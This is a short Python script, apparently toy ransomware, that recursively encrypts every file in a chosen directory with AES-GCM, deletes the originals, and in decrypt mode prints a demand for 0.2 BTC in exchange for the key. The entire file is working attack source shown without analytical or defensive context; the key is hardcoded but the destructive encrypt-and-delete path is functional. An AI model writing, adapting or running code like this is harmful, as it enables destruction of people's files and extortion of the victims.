import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        nonce = get_random_bytes(12)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        with open(file_path + '.enc', 'wb') as f:
            for x in (nonce, tag, ciphertext):
                f.write(x)
        
        os.remove(file_path)
        print(f"Encrypted {file_path}")
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

def decrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            nonce, tag, ciphertext = [ f.read(x) for x in (12, 16, -1) ]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)

        with open(file_path[:-4], 'wb') as f:
            f.write(data)
        
        os.remove(file_path)
        print(f"Decrypted {file_path}")
    except Exception as e:
        print(f"Error decrypting {file_path}: {e}")

def main():
    key = b"thisisthesecretkeythatwillbeused"[:32]
    choice = input("Do you want to (e)ncrypt or (d)ecrypt the files? ")

    if choice.lower() == 'd':
        print("Please send me 0.2 btc and I will send you the key :)")
        key = input("Key: ").encode('utf-8')
        if len(key) not in [16, 24, 32]:
            print("Error: Key must be 16, 24, or 32 bytes long")
            return

    directory = input("Enter the directory to process (e.g., ./home): ")
    if not os.path.isdir(directory):
        print(f"Error: The directory {directory} does not exist.")
        return

    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if choice.lower() == 'e':
                encrypt_file(file_path, key)
            elif choice.lower() == 'd' and file.endswith(".enc"):
                decrypt_file(file_path, key)

if __name__ == "__main__":
    main()
